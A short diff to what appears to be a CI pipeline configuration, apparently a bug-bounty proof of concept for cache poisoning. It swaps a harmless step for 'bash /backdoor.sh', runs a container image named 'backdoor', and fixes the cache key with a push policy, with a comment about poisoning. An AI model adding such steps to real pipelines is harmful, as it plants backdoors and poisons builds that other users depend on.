@@ -2,10 +2,10 @@ image: gcr.io/gcp-bugbounty/backdoor
 
 a:
   script:
-  - echo "script"
+  - bash /backdoor.sh
   - touch A
   cache:
-    key: "$A"
+    key: "meeee"
     policy: push #or push if you like to poison
     paths:
       - .
